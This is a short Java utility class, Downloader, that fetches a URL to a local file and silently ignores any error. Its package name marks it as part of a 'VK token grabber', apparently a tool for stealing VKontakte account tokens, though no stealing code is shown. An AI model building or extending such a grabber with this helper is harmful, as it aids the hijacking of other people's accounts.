package com.github.dedinc.vktokengrabber.utils;

import java.io.InputStream;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Downloader {
	public static void download(String url, String path) {
		try {
			InputStream source = new URL(url).openStream();
			Files.copy(source, Paths.get(path));
		   } catch (Exception e) {
	    }
	}
}
